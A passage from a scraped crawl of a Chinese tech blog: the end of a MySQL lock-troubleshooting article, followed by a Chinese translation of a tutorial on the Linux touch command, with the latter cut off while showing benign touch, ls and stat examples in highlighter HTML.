NULL</p>\n<p>总结：</p>\n<p>1、请对你的业务系统做锁等待的监控，这有助于你了解当前数据库锁情况，以及为你优化业务程序提供帮助；</p>\n<p>2、业务系统中应该对锁等待超时的情况做合适的逻辑判断。</p>\n<p>6、小结</p>\n<p>本文通过几个简单的示例介绍了我们常用的几种MySQL并发问题，并尝试得出针对这些问题我们排查的思路。文中涉及事务、表锁、元数据锁、行锁，但引起并发问题的远远不止这些，例如还有事务隔离级别、GAP锁等。真实的并发问题可能多而复杂，但排查思路和方法却是可以复用，在本文中我们使用了show processlist;show engine innodb status;以及查询元数据表的方法来排查发现问题，如果问题涉及到了复制，还需要借助master/slave监控来协助。</p>\n<p>参考资料：</p>\n<p>姜承尧《InnoDB存储引擎》</p>\n<p>李宏哲 杨挺 《MySQL排查指南》</p>\n<p>何登成 <a href=\"http://hedengcheng.com/\" rel=\"nofollow\">http://hedengcheng.com</a></p>\n<p> </p>\n\r\n        \r\n        \r\n        \n    <div class=\"post-adds\">\n        <span data-post-id=\"113968\" class=\" btn-bluet-bigger href-style vote-post-up   register-user-only \"><i class=\"fa  fa-thumbs-o-up\"></i> <h10 id=\"113968votetotal\">1</h10> 赞</span>\n        <span data-book-type=\"1\" data-site-id=\"2\" data-item-id=\"113968\" data-item-type=\"1\" class=\" btn-bluet-bigger href-style bookmark-btn  register-user-only \"><i class=\"fa fa-bookmark-o  \"></i> 2 收藏</span>\n\n                    <a href=\"#article-comment\"><span class=\"btn-bluet-bigger href-style hide-on-480\"><i class=\"fa fa-comments-o\"></i> 1 评论</span></a>\n        \n        \n        \n        <!-- JiaThis Button BEGIN -->\n        <div class=\"jiathis_style_24x24\" style=\"display: inline-flex; position: relative; margin: 0; clear: both;float: right;\">\n            <a class=\"jiathis_button_tsina\"></a>\n            <a class=\"jiathis_button_weixin\"></a>\n            <a class=\"jiathis_button_qzone\"></a>\n            <a class=\"jiathis_button_fb hide-on-480\"></a>\n            <a href=\"http://www.jiathis.com/share?uid=1745061\" class=\"jiathis jiathis_txt jiathis_separator jtico jtico_jiathis\" target=\"_blank\"></a>\n        </div>\n\n    </div>\n\n\n\n\r\n        <!-- BEGIN #author-bio -->\r\n\r\n\r\n<!-- END #author-bio -->\r\n\t</div>", "tags": "IT技术,数据库", "url": "http://blog.jobbole.com/113968/", "url_obj_id": "00300456460ea6d4134a02e6861bd127"}
{"front_img_url": ["http://jbcdn2.b0.upaiyun.com/2017/05/77d80105fd15f2465894827e23cc4842.jpeg"], "title": "在 Linux 下 9 个有用的 touch 命令示例", "create_date": "2018/05/06 ·", "praise_num": 1, "fav_num": 0, "comment_num": 0, "content": "<div class=\"entry\">\r\n\r\n        \t\t\t<div class=\"textwidget\"></div>\n\t\t\r\n\t\t<div class=\"copyright-area\">原文出处： <a ref=\"nofollow\" target=\"_blank\" href=\"https://www.linuxtechi.com/9-useful-touch-command-examples-linux/\">Pradeep Kumar</a>   译文出处：<a target=\"_blank\" href=\"https://linux.cn/article-9597-1.html\">Linux中国/MjSeven</a>   </div><p><code>touch</code> 命令用于创建空文件，也可以更改 Unix 和 Linux 系统上现有文件时间戳。这里所说的更改时间戳意味着更新文件和目录的访问以及修改时间。</p>\n<p>让我们来看看 <code>touch</code> 命令的语法和选项：</p>\n<p><strong>语法</strong>：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5b4aa93106cf0192935478\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n# touch {选项} {文件}\r\n</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5b4aa93106cf0192935478-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa93106cf0192935478-2\">2</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5b4aa93106cf0192935478-1\"><span class=\"crayon-p\"># touch {选项} {文件}</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa93106cf0192935478-2\"> </div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0003 seconds] -->\r\n<p><code>touch</code> 命令中使用的选项：</p>\n<p><img class=\"aligncenter\" src=\"http://jbcdn2.b0.upaiyun.com/2018/05/6935db9d7347a8379097b2fa18a81a09.jpg\" alt=\"touch-command-options\"></p>\n<p>在这篇文章中，我们将介绍 Linux 中 9 个有用的 <code>touch</code> 命令示例。</p>\n<h3 id=\"toc_1\">示例：1 使用 touch 创建一个空文件</h3>\n<p>要在 Linux 系统上使用 <code>touch</code> 命令创建空文件，键入 <code>touch</code>，然后输入文件名。如下所示：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5b4aa93106cf8126147969\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n[root@linuxtechi ~]# touch devops.txt\r\n[root@linuxtechi ~]# ls -l devops.txt\r\n-rw-r--r--. 1 root root 0 Mar 29 22:39 devops.txt\r\n</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5b4aa93106cf8126147969-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa93106cf8126147969-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5b4aa93106cf8126147969-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa93106cf8126147969-4\">4</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5b4aa93106cf8126147969-1\"><span class=\"crayon-sy\">[</span><span class=\"crayon-v\">root</span><span class=\"crayon-sy\">@</span><span class=\"crayon-v\">linuxtechi</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">~</span><span class=\"crayon-sy\">]</span><span class=\"crayon-p\"># touch devops.txt</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa93106cf8126147969-2\"><span class=\"crayon-sy\">[</span><span class=\"crayon-v\">root</span><span class=\"crayon-sy\">@</span><span class=\"crayon-v\">linuxtechi</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">~</span><span class=\"crayon-sy\">]</span><span class=\"crayon-p\"># ls -l devops.txt</span></div><div class=\"crayon-line\" id=\"crayon-5b4aa93106cf8126147969-3\"><span class=\"crayon-o\">-</span><span class=\"crayon-v\">rw</span><span class=\"crayon-o\">-</span><span class=\"crayon-v\">r</span><span class=\"crayon-o\">--</span><span class=\"crayon-v\">r</span><span class=\"crayon-o\">--</span><span class=\"crayon-sy\">.</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">1</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">root </span><span class=\"crayon-i\">root</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">0</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">Mar</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">29</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">22</span><span class=\"crayon-o\">:</span><span class=\"crayon-cn\">39</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">devops</span><span class=\"crayon-sy\">.</span><span class=\"crayon-i\">txt</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa93106cf8126147969-4\"> </div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0011 seconds] -->\r\n<p></p>\n<h3 id=\"toc_2\">示例：2 使用 touch 创建批量空文件</h3>\n<p>可能会出现一些情况，我们必须为某些测试创建大量空文件，这可以使用 <code>touch</code> 命令轻松实现：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5b4aa93106cfd781278855\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n[root@linuxtechi ~]# touch sysadm-{1..20}.txt\r\n</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5b4aa93106cfd781278855-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa93106cfd781278855-2\">2</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5b4aa93106cfd781278855-1\"><span class=\"crayon-sy\">[</span><span class=\"crayon-e\">root</span><span class=\"crayon-sy\">@</span><span class=\"crayon-e\">linuxtechi</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">~</span><span class=\"crayon-sy\">]</span><span class=\"crayon-p\"># touch sysadm-{1..20}.txt</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa93106cfd781278855-2\"> </div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0004 seconds] -->\r\n<p>在上面的例子中，我们创建了 20 个名为 <code>sysadm-1.txt</code> 到 <code>sysadm-20.txt</code> 的空文件，你可以根据需要更改名称和数字。</p>\n<h3 id=\"toc_3\">示例：3 改变/更新文件和目录的访问时间</h3>\n<p>假设我们想要改变名为 <code>devops.txt</code> 文件的访问时间，在 <code>touch</code> 命令中使用 <code>-a</code> 选项，然后输入文件名。如下所示：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5b4aa93106d00922109100\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n[root@linuxtechi ~]# touch -a devops.txt\r\n</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5b4aa93106d00922109100-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa93106d00922109100-2\">2</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5b4aa93106d00922109100-1\"><span class=\"crayon-sy\">[</span><span class=\"crayon-v\">root</span><span class=\"crayon-sy\">@</span><span class=\"crayon-v\">linuxtechi</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">~</span><span class=\"crayon-sy\">]</span><span class=\"crayon-p\"># touch -a devops.txt</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa93106d00922109100-2\"> </div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0004 seconds] -->\r\n<p>现在使用 <code>stat</code> 命令验证文件的访问时间是否已更新：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5b4aa93106d04751347358\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n[root@linuxtechi ~]# stat devops.txt\r\n  File: 'devops.txt'\r\n  Size: 0               Blocks: 0          IO Block: 4096   regular empty file\r\nDevice: fd00h/64768d    Inode: 67324178    Links: 1\r\nAccess: (0644/-rw-r--r--)  Uid: (    0/    root)   Gid: (    0/    root)\r\nContext: unconfined_u:object_r:admin_home_t:s0\r\nAccess: 2018-03-29 23:03:10.902000000 -0400\r\nModify: 2018-03-29 22:39:29.365000000 -0400\r\nChange: 2018-03-29 23:03:10.902000000 -0400\r\n Birth: -\r\n</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5b4aa93106d04751347358-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa93106d04751347358-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5b4aa93106d04751347358-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa93106d04751347358-4\">4</div><div class=\"crayon-num\" data-line=\"crayon-5b4aa93106d04751347358-5\">5</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa93106d04751347358-6\">6</div><div class=\"crayon-num\" data-line=\"crayon-5b4aa93106d04751347358-7\">7</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa93106d04751347358-8\">8</div><div class=\"crayon-num\" data-line=\"crayon-5b4aa93106d04751347358-9\">9</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa93106d04751347358-10\">10</div><div class=\"crayon-num\" data-line=\"crayon-5b4aa93106d04751347358-11\">11</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5b4aa93106d04751347358-1\"><span class=\"crayon-sy\">[</span><span class=\"crayon-v\">root</span><span class=\"crayon-sy\">@</span><span class=\"crayon-v\">linuxtechi</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">~</span><span class=\"crayon-sy\">]</span><span class=\"crayon-p\"># stat devops.txt</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa93106d04751347358-2\"><span class=\"crayon-h\">  </span><span class=\"crayon-v\">File</span><span class=\"crayon-o\">:</span><span class=\"crayon-h\"> </span><span class=\"crayon-s\">'devops.txt'</span></div><div class=\"crayon-line\" id=\"crayon-5b4aa93106d04751347358-3\"><span class=\"crayon-h\">  </span><span class=\"crayon-v\">Size</span><span class=\"crayon-o\">:</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">0</span><span class=\"crayon-h\">               </span><span class=\"crayon-v\">Blocks</span><span class=\"crayon-o\">:</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">0</span><span class=\"crayon-h\">          </span><span class=\"crayon-e\">IO </span><span class=\"crayon-v\">Block</span><span class=\"crayon-o\">:</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">4096</span><span class=\"crayon-h\">   </span><span class=\"crayon-e\">regular </span><span class=\"crayon-e\">empty </span><span class=\"crayon-e\">file</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa93106d04751347358-4\"><span class=\"crayon-v\">Device</span><span class=\"crayon-o\">:</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">fd00h</span><span class=\"crayon-o\">/</span><span class=\"crayon-cn\">64768d</span><span class=\"crayon-h\">    </span><span class=\"crayon-v\">Inode</span><span class=\"crayon-o\">:</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">67324178</span><span class=\"crayon-h\">    </span><span class=\"crayon-v\">Links</span><span class=\"crayon-o\">:</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">1</span></div><div class=\"crayon-line\" id=\"crayon-5b4aa93106d04751347358-5\"><span class=\"crayon-v\">Access</span><span class=\"crayon-o\">:</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">(</span><span class=\"crayon-cn\">0644</span><span class=\"crayon-o\">/</span><span class=\"crayon-o\">-</span><span class=\"crayon-v\">rw</span><span class=\"crayon-o\">-</span><span class=\"crayon-v\">r</span><span class=\"crayon-o\">--</span><span class=\"crayon-v\">r</span><span class=\"crayon-o\">--</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\">  </span><span class=\"crayon-v\">Uid</span><span class=\"crayon-o\">:</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">(</span><span class=\"crayon-h\">    </span><span class=\"crayon-cn\">0</span><span class=\"crayon-o\">/</span><span class=\"crayon-h\">    </span><span class=\"crayon-v\">root</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\">   </span><span class=\"crayon-v\">Gid</span><span class=\"crayon-o\">:</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">(</span><span class=\"crayon-h\">    </span><span class=\"crayon-cn\">0</span><span class=\"crayon-o\">/</span><span class=\"crayon-h\">    </span><span class=\"crayon-v\">root</span><span class=\"crayon-sy\">)</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa93106d04751347358-6\"><span class=\"crayon-v\">Context</span><span class=\"crayon-o\">:</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">unconfined_u</span><span class=\"crayon-o\">:</span><span class=\"crayon-v\">object_r</span><span class=\"crayon-o\">:</span><span class=\"crayon-v\">admin_home_t</span><span class=\"crayon-o\">:</span><span class=\"crayon-e\">s0</span></div><div class=\"crayon-line\" id=\"crayon-5b4aa93106d04751347358-7\"><span class=\"crayon-v\">Access</span><span class=\"crayon-o\">:</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">2018</span><span class=\"crayon-o\">-</span><span class=\"crayon-cn\">03</span><span class=\"crayon-o\">-</span><span class=\"crayon-cn\">29</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">23</span><span class=\"crayon-o\">:</span><span class=\"crayon-cn\">03</span><span class=\"crayon-o\">:</span><span class=\"crayon-cn\">10.902000000</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-cn\">0400</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa93106d04751347358-8\"><span class=\"crayon-v\">Modify</span><span class=\"crayon-o\">:</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">2018</span><span class=\"crayon-o\">-</span><span class=\"crayon-cn\">03</span><span class=\"crayon-o\">-</span><span class=\"crayon-cn\">29</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">22</span><span class=\"crayon-o\">:</span><span class=\"crayon-cn\">39</span><span class=\"crayon-o\">:</span><span class=\"crayon-cn\">29.365000000</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-cn\">0400</span></div><div class=\"crayon-line\" id=\"crayon-5b4aa93106d04751347358-9\"><span class=\"crayon-v\">Change</span><span class=\"crayon-o\">:</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">2018</span><span class=\"crayon-o\">-</span><span class=\"crayon-cn\">03</span><span class=\"crayon-o\">-</span><span class=\"crayon-cn\">29</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">23</span><span class=\"crayon-o\">:</span><span class=\"crayon-cn\">03</span><span class=\"crayon-o\">:</span><span class=\"crayon-cn\">10.902000000</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-cn\">0400</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa93106d04751347358-10\"><span class=\"crayon-h\"> </span><span class=\"crayon-v\">Birth</span><span class=\"crayon-o\">:</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span></div><div class=\"crayon-line\" id=\"crayon-5b4aa93106d04751347358-11\"> </div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0030 seconds] -->\r\n<p><strong>改变目录的访问时间：</strong></p>\n<p>假设我们在 <code>/mnt</code> 目录下有一个 <code>nfsshare</code> 文件夹，让我们用下面的命令改变这个文件夹的访问时间：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5b4aa93106d07084173790\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div 